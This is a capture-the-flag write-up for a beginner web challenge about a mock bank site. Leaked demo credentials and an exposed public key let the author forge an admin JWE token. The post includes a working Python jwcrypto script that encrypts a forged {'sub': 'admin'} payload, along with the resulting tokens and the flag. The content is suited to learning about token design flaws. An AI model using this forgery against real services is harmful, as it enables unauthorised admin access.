---
title: "Break the Bank"
date: 2026-03-19T02:15:43+05:30
tags: ["beginner"]
categories: ["web"]
authors: ['curious_codist']
description: "baseball, huh"
---

# Break the Bank

<!-- DESCRIPTION -->
> Let's just say that this bank isn't exactly following the latest trends in web design (or web security, for that matter). Just take a look at that website!

points: `177`

solves: `282`

handouts: ``challenge.utctf.live:5926``(likely would go down tho..)

author: `@emdawg25`

---
## Solution
 Upon looking at the / page of the website, I found this particularly interesting section
 ```html
  <span style="font-size:9px; color:#aaaaaa;">
    <em>Prospective customers:</em> 
    Interested in learning more about FNSB Internet Banking?
    <a href="/resources/FNSB_InternetBanking_Guide.pdf" style="color:#aaddff;">
    Access our Internet Banking guide here.</a>
  </span>
 ```
In the resource pdf, there was something written like this:-
 ```
					 DEMONSTRATION LOGIN CREDENTIALS
Website: http://www.fnsb.com/login
Username: testuser
Password: testpass123
			For demonstration purposes only. Not a real account.
 ```
 Also, while checking, I found an open endpoint at /resources.
 That  contained one key.pem and one memo.txt.
 ```
 -----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsio2dcXheqKLrteRx4V1
7FchW6AE2zszlMyiN8S7D16ww1a9AFC8EQhEHNW1PLXncXiimNeb6/oZP2+V18gE
ZoyKIET2oHC4MmthSOFrW0nFgfgRJdH7VyEVHupFL6tFAJvHFWVplTgCdqtegihG
cG7XKUGah4Q8FytlIhk/A983LtbblhAnfKTeBwxT2wVZE9+5pWhPmdGLoX3Hf0Uy
pHJTkL6D7C4X4KGJiNrSJ6mJw4sDpXlZEvagB0uFaO4b22WX6HSf2ZOBW5VHEWS5
TiKvliyTQL3FJWXefqxHgQL8diDWhWwYXI7Q0b+otJ5/G/jMGL2S+N10oJTitTuK
OQIDAQAB
-----END PUBLIC KEY-----
 ```
In the memo.txt, this was there
```
the team should ensure that any development or convenience
credentials that were introduced during the initial build and
testing phases are reviewed and retired before the platform 
is considered production-ready.
```
Obviously, this meant that we just had to try the test credentials now. And lo and behold, using those, I got in. Now, I extracted the fnsb_token from there.
```
eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0.Cji1afCA3AAVy4GvhmKt_aY9YYjs-eH-nuJn1fDpu4y3791jHUcxma4c83Zkf81fuWpIn-zS80bH-d_M-xu63FbnxW6mLN4E81Ky2mEUcDmtybiBlR26jDe_p8T7ijk4ql4wwZ9aAQf1zdqX36G-NL94uveNt8ZQxgsa9Aq8mWEkV7-Y9EdAWcj4R6KF8LBFGo3ZO-NtHB8f7OzUoH0u9dwGTFIjWpXFGeYmoq_XRiAQuqih88nAtQMQBilhl7mwjkMV3Mi2yGUHqismZFr9Ur6rxOb5ojIjEGuRhfPzEMrhh0_0ipg0B5tv4g6MTF4nrrvt45bLZrhX6HFGXq0Uxw.oXhmoxDhIfXffoqQ.66tCZQUt_9fucvtngHYqI42ONzSCnt-VKlhSqqn3hvwXcmUR7KAYapRJkXkzOGK-LvY84poA3oYkY1UwgsEmods2YO77ac3bMpr4oPDYGnuekyl24GGF0W1bNyjrI7p3rFtHvGDzVLVc6sQ1D2JUAssIpEItlB1ifcezGGDZmf7BErh54Dz5E1H4zePPPolQPmBnvGzPlbgLTTuCVvigj6altf76ZpREz2Wd0q3Yq3PqQJ3ZpKo6kCfEW5O-uIDsINbHnThH0EH3zlUpEsTEvg-Q3KdMFmGoPhoQhxbH_-HlYdf-B_GsQSzEpRclZiTlVNET_3zUYxQgtL_V2K75t1nl5H9WerhDl2v7CQWeLO9net_ls8Ib5mnZD7rELFjxkp_XfJQgX99MYOuwTRwELQIJRtdqL1B1edBUjZ1671ICXa2TJWZW3dGoZkFz_hgv3kvo7JuB0XcxqdzyoPRbbc6vitY0VOD-HcV2x135T3EZ-QA1k8s7D2g1U6obysE3ayEklP8BCg9rqm3w1RcXZ51GIBvCIw8KlC3chxWE97yXkJN0vsH-HZb2lUJAxWHrR-YE4p0dnmROvVCJZT5hXFxjJ7EN_ohnVCtxWHIkbFHB13cDd32IDadD6AlvPEF6-i_Od_-VF1Dg0r-QsHULvV0XLyrcAQFYT1A1ejPqwQ.ohAFBrCww_oZ0UyFhVraJg
```
We needed this to know the structure of the fnsb_token. At first, this looked like a standard JWT. But upon decrypting it at jwt.io. I realized there is a base64-encoded header with
```
{
  "cty": "JWT",
  "enc": "A256GCM",
  "alg": "RSA-OAEP-256"
}
```
This is JWE token - a 5 section token with a header, encrypted key, IV, ciphertext and an auth tag. So, what it basically does is its initially encrypted with the public key and the server then decrypts it with its private key. As we have the public key in our hands, we can encrypt our own payload with it.
Now, going to /admin as a test reveals it errored :-```"Forbidden: admin subject required"``` 
That means we need a fnsb_token such that we have the sub set to admin.
The below code attempts to do so..

--- 

## Code and output
### Code
```python
from jwcrypto import jwk, jwe
import json

# Leaked public key from /resources/key.pem
public_key_pem = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsio2dcXheqKLrteRx4V1
7FchW6AE2zszlMyiN8S7D16ww1a9AFC8EQhEHNW1PLXncXiimNeb6/oZP2+V18gE
ZoyKIET2oHC4MmthSOFrW0nFgfgRJdH7VyEVHupFL6tFAJvHFWVplTgCdqtegihG
cG7XKUGah4Q8FytlIhk/A983LtbblhAnfKTeBwxT2wVZE9+5pWhPmdGLoX3Hf0Uy
pHJTkL6D7C4X4KGJiNrSJ6mJw4sDpXlZEvagB0uFaO4b22WX6HSf2ZOBW5VHEWS5
TiKvliyTQL3FJWXefqxHgQL8diDWhWwYXI7Q0b+otJ5/G/jMGL2S+N10oJTitTuK
OQIDAQAB
-----END PUBLIC KEY-----"""

key = jwk.JWK.from_pem(public_key_pem)

# The server requires the "admin" subject 
payload = json.dumps({"sub": "admin"})

protected_header = {
    "alg": "RSA-OAEP-256",
    "enc": "A256GCM",
    "cty": "JWT"
}

# Encrypt the forged payload using the public key
jwetoken = jwe.JWE(payload.encode('utf-8'),
                   recipient=key,
                   protected=protected_header)

print(jwetoken.serialize(compact=True)

```
### Output
```
eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIn0.CKCKR3gUIRACKT-EKRrpILqqIoSuKgrzFIlOo5ErOURvNEEt6qTqjeiAAVRdJAp0dKYNrc2APdC_lLi50AG0DCGvlM6_-BPHWyEZbt4OgxjTMsG9HMdKI_vDI_MunHC7wZxNlANsgfHEbeHBrbX8ugg0bhEm7yIxtCAy5-iqiSdSV1EmAo6sdrmuCz-zdhGK5p3D0tdFAj6LGDOGmRSwOwYqg7dbmlT3TjyyZoG7FVz8Mhq3d-vHJIKVtI93rp3eRB6Va7huk7mQJRGprD-_5Jk0i9DY-MRBEZeoG_9QqbFJSj27I5HYQHYQS385gCaNaNhdmaAIx7OaoQ_jDhr-oQ.UPdvY5qaXzVsjUL-.2voNyAgsPHATUyPC_yuM6A.yN9Km8Pp4SQ4VWnKI-rE_Q
```
---
## Final steps

Using our payload-loaded token, I now attempted a GET /admin on burpsuite, replaced the fnsb_token to our new token and then sent it. I was immediately met by the admin terminal and in the centre the flag. 
```
utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}
```
---